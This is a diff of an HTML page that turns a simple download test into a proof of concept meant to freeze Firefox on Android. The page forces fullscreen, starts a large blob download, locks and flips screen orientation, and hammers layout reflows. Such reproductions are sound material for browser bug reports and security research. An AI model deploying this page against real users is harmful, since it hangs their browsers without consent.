@@ -1,58 +1,134 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Download + Orientation Test</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FF Android Freeze POC</title>
   <style>
-    body {
-      margin: 0;
-      font-family: Arial;
-      text-align: center;
-    }
-
-    .box {
-      height: 200vh;
-      background: linear-gradient(white, gray);
-    }
-
-    button {
-      padding: 15px;
-      font-size: 18px;
-      margin-top: 20px;
-    }
+    body { font-family: monospace; background: #111; color: #0f0; padding: 10px; }
+    button { padding: 12px 24px; font-size: 16px; margin: 5px; display: block; width: 100%; }
+    #log { margin-top: 10px; font-size: 12px; border: 1px solid #0f0; padding: 8px; min-height: 100px; }
+    .heavy { height: 300vh; background: repeating-linear-gradient(45deg, #222, #333 10px); }
   </style>
 </head>
-
 <body>
+<h3>FF Android Freeze POC</h3>
 
-<h2>Download + Orientation Change Test</h2>
-<button onclick="startTest()">Start Test</button>
+<button onclick="requestFullscreenAndTest()">Step 1: Enter Fullscreen</button>
+<button onclick="startPOC()" id="btnPOC" disabled>Step 2: Start POC</button>
 
-<div class="box"></div>
+<div id="log"></div>
+<!-- Layout berat supaya reflow mahal -->
+<div class="heavy"></div>
 
 <script>
-function startTest() {
+const log = (m) => {
+  const d = document.getElementById('log');
+  d.innerHTML += `[${Date.now() % 100000}] ${m}<br>`;
+  d.scrollTop = d.scrollHeight;
+};
 
-  // Step 1: trigger download
-  let a = document.createElement('a');
-  a.download = "verylong_꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁_file.txt";
-  a.href = "data:text/plain,This is a test file";
+// ===== Step 1: Fullscreen (wajib untuk screen.orientation.lock) =====
+async function requestFullscreenAndTest() {
+  try {
+    await document.documentElement.requestFullscreen({ navigationUI: "hide" });
+    log('[+] Fullscreen granted');
+    document.getElementById('btnPOC').disabled = false;
+  } catch(e) {
+    log('[-] Fullscreen failed: ' + e.message);
+    log('[*] Coba manual: putar device lalu jalankan Step 2');
+    document.getElementById('btnPOC').disabled = false;
+  }
+}
+
+// ===== Core POC =====
+async function startPOC() {
+  log('[*] POC started');
+
+  // Track orientationchange event
+  window.addEventListener('orientationchange', () => {
+    log('[!] orientationchange fired → type: ' + (screen.orientation?.type ?? window.orientation));
+  }, { once: false });
+
+  screen.orientation?.addEventListener('change', () => {
+    log('[!] screen.orientation change → ' + screen.orientation.type);
+  });
+
+  // Step A: Picu download via Blob (tidak di-block Firefox)
+  triggerDownload();
+
+  // Step B: Langsung lock orientasi → paksa Gecko reflow
+  // Jeda 200ms agar download bar muncul dulu
+  setTimeout(async () => {
+    await forceOrientationFlip();
+  }, 200);
+
+  // Step C: Banjir reflow tambahan saat orientasi sedang berubah
+  setTimeout(() => {
+    hammerlayout();
+  }, 250);
+}
+
+// ===== Download trigger =====
+function triggerDownload() {
+  // Buat Blob besar supaya download notification lebih lama muncul
+  const size = 5 * 1024 * 1024; // 5MB
+  const buf = new Uint8Array(size).fill(65);
+  const blob = new Blob([buf], { type: 'application/octet-stream' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'poc_test.bin';
+  document.body.appendChild(a);
   a.click();
+  document.body.removeChild(a);
+  setTimeout(() => URL.revokeObjectURL(url), 3000);
+  log('[+] Download triggered (5MB blob)');
+}
 
-  // Step 2: force layout change (simulate orientation effect)
-  setTimeout(() => {
-    document.body.style.width = "200vw";
-    document.body.style.transform = "rotate(90deg)";
-    document.body.style.transformOrigin = "left top";
-  }, 100);
+// ===== Orientation flip via lock API =====
+async function forceOrientationFlip() {
+  const current = screen.orientation?.type ?? '';
+  const isPortrait = current.includes('portrait') || window.innerHeight > window.innerWidth;
+  const target = isPortrait ? 'landscape' : 'portrait';
 
-  // Step 3: revert (biar keliatan glitch kalau ada)
-  setTimeout(() => {
-    document.body.style.transform = "rotate(0deg)";
-    document.body.style.width = "100vw";
-  }, 1000);
+  log(`[*] Attempting orientation lock → ${target}`);
+  try {
+    await screen.orientation.lock(target);
+    log('[+] Lock berhasil → ' + screen.orientation.type);
+
+    // Flip balik setelah 600ms (double reflow)
+    setTimeout(async () => {
+      try {
+        await screen.orientation.lock(isPortrait ? 'portrait' : 'landscape');
+        log('[+] Flip balik berhasil');
+        screen.orientation.unlock();
+        log('[+] Unlocked');
+      } catch(e) {
+        log('[-] Flip balik gagal: ' + e.message);
+      }
+    }, 600);
+
+  } catch(e) {
+    log('[-] Lock gagal: ' + e.message);
+    log('[*] Fallback: gunakan physical rotation saat download muncul');
+  }
+}
+
+// ===== Layout hammer: paksa Gecko reflow berulang =====
+function hammerlayout() {
+  log('[*] Layout hammer started');
+  let count = 0;
+  const interval = setInterval(() => {
+    // Baca layout property → paksa flush reflow
+    const _ = document.body.getBoundingClientRect();
+    document.body.style.paddingTop = (count % 2 === 0) ? '1px' : '0px';
+    count++;
+    if (count >= 30) {
+      clearInterval(interval);
+      log('[*] Layout hammer done (' + count + ' reflows)');
+    }
+  }, 16); // ~60fps
 }
 </script>
-
 </body>
 </html>
